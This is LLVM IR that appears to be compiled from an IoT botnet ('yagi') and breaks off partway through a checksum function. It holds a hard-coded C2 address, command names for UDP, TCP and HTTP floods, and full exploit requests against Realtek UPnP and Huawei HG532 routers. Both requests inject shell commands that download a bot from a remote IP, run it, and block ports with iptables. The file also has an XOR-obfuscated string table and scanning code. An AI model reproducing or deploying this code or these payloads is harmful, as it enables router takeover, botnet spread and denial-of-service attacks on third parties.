; ModuleID = 'llvm-link'
source_filename = "llvm-link"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.in_addr = type { i32 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.exploit_scanner_connection = type { i32, i32, i32, i32, i16, i32, [256 x i8], i8**, [2560 x i8], [2560 x i8], i32 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.udphdr = type { i16, i16, i16, i16 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }

@c2_bot_port = dso_local global i32 27, align 4
@.str = private unnamed_addr constant [15 x i8] c"185.244.25.149\00", align 1
@c2_http_host = dso_local global i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i32 0, i32 0), align 8
@numattackpids = dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.2 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.3 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.4 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.5 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.6 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.7 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.8 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.9 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.10 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.11 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.12 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.13 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.14 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.15 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.16 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.17 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.18 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.19 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.20 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.21 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.22 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.23 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.24 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.25 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.27 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.28 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.30 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.31 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.32 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.33 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.34 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.35 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.36 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.37 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.38 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.39 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@UserAgents = dso_local global [39 x i8*] [i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([102 x i8], [102 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([139 x i8], [139 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([137 x i8], [137 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([120 x i8], [120 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([142 x i8], [142 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([118 x i8], [118 x i8]* @.str.39, i32 0, i32 0)], align 16
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@ourIP = dso_local global %struct.in_addr zeroinitializer, align 4
@.str.40 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.41 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.43 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.44 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.45 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.46 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.47 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.48 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.49 = private unnamed_addr constant [19 x i8] c"Invalid flag \22%s\22\0A\00", align 1
@.str.50 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@.str.51 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"connect\00", align 1
@.str.53 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@attackpids = dso_local global i32* null, align 8
@retry = dso_local global i32 1, align 4
@retrys = dso_local global i32 3, align 4
@tryagain = dso_local global i32 1, align 4
@max_attacks = dso_local global i32 4, align 4
@maxboot_time = dso_local global i32 600, align 4
@.str.54 = private unnamed_addr constant [2 x i8] c"@\00", align 1
@trigger = dso_local global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.54, i32 0, i32 0), align 8
@C2 = dso_local global i32 -1, align 4
@ioctl_pid = dso_local global i32 0, align 4
@.str.55 = private unnamed_addr constant [15 x i8] c"arch yagi.%s\0D\0A\00", align 1
@c2_host = dso_local global [16 x i8] zeroinitializer, align 16
@.str.56 = private unnamed_addr constant [5 x i8] c"kill\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"stop\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"killattk\00", align 1
@.str.59 = private unnamed_addr constant [3 x i8] c"kt\00", align 1
@.str.60 = private unnamed_addr constant [4 x i8] c"udp\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"udpflood\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"tcp\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"tcpflood\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"stdflood\00", align 1
@.str.66 = private unnamed_addr constant [5 x i8] c"http\00", align 1
@.str.67 = private unnamed_addr constant [10 x i8] c"httpflood\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c" \00", align 1
@Socket = dso_local global %struct.sockaddr_in zeroinitializer, align 4
@.str.69 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@buf = dso_local global [1024 x i8] zeroinitializer, align 16
@buffer = dso_local global i32 0, align 4
@.str.70 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"PONG\0D\0A\00", align 1
@.str.72 = private unnamed_addr constant [11 x i8] c"killc2proc\00", align 1
@scanPid = dso_local global i32 0, align 4
@pongresponse = dso_local global [25 x i8] zeroinitializer, align 16
@exploit_scanner_pid = dso_local global i32 0, align 4
@exploit_rsck = dso_local global i32 0, align 4
@exploit_scanner_rawpkt = dso_local global [40 x i8] zeroinitializer, align 16
@exploit_fake_time = dso_local global i32 0, align 4
@.str.73 = private unnamed_addr constant [920 x i8] c"POST /UD/?9 HTTP/1.1\0D\0AUser-Agent: SEFA\0D\0AContent-Type: text/xml\0D\0ASOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:AddPortMapping xmlns:u=\22urn:schemas-upnp-org:service:WANIPConnection:1\22><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://89.34.26.138/yagi.sh -O - > yagi.sh; chmod 777 yagi.sh; sh yagi.sh; rm yagi.sh; iptables -A INPUT -p tcp --destination-port 5555 -j DROP`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\00", align 1
@huawei_scanner_pid = dso_local global i32 0, align 4
@huawei_rsck = dso_local global i32 0, align 4
@huawei_scanner_rawpkt = dso_local global [40 x i8] zeroinitializer, align 16
@huawei_fake_time = dso_local global i32 0, align 4
@conn_table = dso_local global %struct.exploit_scanner_connection* null, align 8
@.str.77 = private unnamed_addr constant [887 x i8] c"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\0D\0AContent-Length: 430\0D\0AConnection: keep-alive\0D\0AAccept: */*\0D\0AAuthorization: Digest username=\22dslf-config\22, realm=\22HuaweiHomeGateway\22, nonce=\2288645cefb1f9ede0e336e3569d75ee30\22, uri=\22/ctrlt/DeviceUpgrade_1\22, response=\223612f843a42db38f48f59d2a3597e19c\22, algorithm=\22MD5\22, qop=\22auth\22, nc=00000001, cnonce=\22248d1a2560100669\22\0D\0A\0D\0A<?xml version=\221.0\22 ?><s:Envelope xmlns:s=\22http://schemas.xmlsoap.org/soap/envelope/\22 s:encodingStyle=\22http://schemas.xmlsoap.org/soap/encoding/\22><s:Body><u:Upgrade xmlns:u=\22urn:schemas-upnp-org:service:WANPPPConnection:1\22><NewStatusURL>$(/bin/busybox wget -g 89.34.26.138 -l /tmp/yagi -r /bins/yagi.mips; /bin/busybox chmod 777 * /tmp/yagi; /tmp/yagi ; /bin/busybox iptables -A INPUT -p tcp --destination-port 37215 -j DROP)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\0D\0A\0D\0A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table_key = dso_local global i32 -554832193, align 4
@.str.84 = private unnamed_addr constant [15 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.1.85 = private unnamed_addr constant [20 x i8] c"M\06\07\14M\0F\0B\11\01M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.2.86 = private unnamed_addr constant [24 x i8] c"M\06\07\14M$65&6SRS=\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.3.87 = private unnamed_addr constant [25 x i8] c"M\06\07\14M$65&6SRS>B\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.4.88 = private unnamed_addr constant [16 x i8] c"M\06\07\14M\15\03\16\01\0A\06\0D\05Rb\00", align 1
@.str.5.89 = private unnamed_addr constant [23 x i8] c"M\07\16\01M\06\07\04\03\17\0E\16M\15\03\16\01\0A\06\0D\05b\00", align 1
@.str.6.90 = private unnamed_addr constant [16 x i8] c"M\11\00\0B\0CM\15\03\16\01\0A\06\0D\05b\00", align 1
@table = dso_local global [8 x %struct.table_value] zeroinitializer, align 16
@LOCAL_ADDR = dso_local global i32 0, align 4

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @init_rand(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

10:                                               ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

13:                                               ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = xor i32 %18, %23
  %25 = xor i32 %24, -1640531527
  %26 = load i32, i32* %3, align 4
  %27 = xor i32 %25, %26
  %28 = load i32, i32* %3, align 4
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  store i32 %27, i32* %30, align 4
  br label %31

31:                                               ; preds = %13
  %32 = load i32, i32* %3, align 4
  %33 = add nsw i32 %32, 1
  store i32 %33, i32* %3, align 4
  br label %10, !llvm.loop !6

34:                                               ; preds = %10
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, 1
  %7 = and i32 %6, 4095
  store i32 %7, i32* @rand_cmwc.i, align 4
  %8 = load i64, i64* %2, align 8
  %9 = load i32, i32* @rand_cmwc.i, align 4
  %10 = zext i32 %9 to i64
  %11 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %10
  %12 = load i32, i32* %11, align 4
  %13 = zext i32 %12 to i64
  %14 = mul i64 %8, %13
  %15 = load i32, i32* @c, align 4
  %16 = zext i32 %15 to i64
  %17 = add i64 %14, %16
  store i64 %17, i64* %1, align 8
  %18 = load i64, i64* %1, align 8
  %19 = lshr i64 %18, 32
  %20 = trunc i64 %19 to i32
  store i32 %20, i32* @c, align 4
  %21 = load i64, i64* %1, align 8
  %22 = load i32, i32* @c, align 4
  %23 = zext i32 %22 to i64
  %24 = add i64 %21, %23
  %25 = trunc i64 %24 to i32
  store i32 %25, i32* %3, align 4
  %26 = load i32, i32* %3, align 4
  %27 = load i32, i32* @c, align 4
  %28 = icmp ult i32 %26, %27
  br i1 %28, label %29, label %34

29:                                               ; preds = %0
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, 1
  store i32 %31, i32* %3, align 4
  %32 = load i32, i32* @c, align 4
  %33 = add i32 %32, 1
  store i32 %33, i32* @c, align 4
  br label %34

34:                                               ; preds = %29, %0
  %35 = load i32, i32* %4, align 4
  %36 = load i32, i32* %3, align 4
  %37 = sub i32 %35, %36
  %38 = load i32, i32* @rand_cmwc.i, align 4
  %39 = zext i32 %38 to i64
  %40 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %39
  store i32 %37, i32* %40, align 4
  ret i32 %37
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @makeRandomStr(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

6:                                                ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

10:                                               ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

19:                                               ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6, !llvm.loop !8

22:                                               ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @getRandomIP(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 noundef %4) #10
  %6 = load i32, i32* %2, align 4
  %7 = and i32 %5, %6
  store i32 %7, i32* %3, align 4
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @rand_cmwc()
  %10 = load i32, i32* %2, align 4
  %11 = xor i32 %10, -1
  %12 = and i32 %9, %11
  %13 = xor i32 %8, %12
  ret i32 %13
}

; Function Attrs: nounwind readnone willreturn
declare i32 @ntohl(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @csum(i16* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

6:                                                ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %18

9:                                                ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  %16 = load i32, i32* %4, align 4
  %17 = sub nsw i32 %16, 2
  store i32 %17, i32* %4, align 4
  br label %6, !llvm.loop !9

18:                                               ; preds = %6
  %19 = load i32, i32* %4, align 4
  %20 = icmp sgt i32 %19, 0
  br i1 %20, label %21, label %28

21:                                               ; preds = %18
  %22 = load i16*, i16** %3, align 8
  %23 = bitcast i16* %22 to i8*
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i64
  %26 = load i64, i64* %5, align 8
  %27 = add i64 %26, %25
  store i64 %27, i64* %5, align 8
  br label %28

28:                                               ; preds = %21, %18
  br label %29

29:                                               ; preds = %33, %28
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = icmp ne i64 %31, 0
  br i1 %32, label %33, label %39

33:                                               ; preds = %29
  %34 = load i64, i64* %5, align 8
  %35 = and i64 %34, 65535
  %36 = load i64, i64* %5, align 8
  %37 = lshr i64 %36, 16
  %38 = add i64 %35, %37
  store i64 %38, i64* %5, align 8
  br label %29, !llvm.loop !10

39:                                               ; preds = %29
  %40 = load i64, i64* %5, align 8
  %41 = xor i64 %40, -1
  %42 = trunc i64 %41 to i16
  ret i16 %42
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local zeroext i16 @tcpcsum(%struct.iphdr* noundef %0, %struct.tcphdr* noundef %1) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
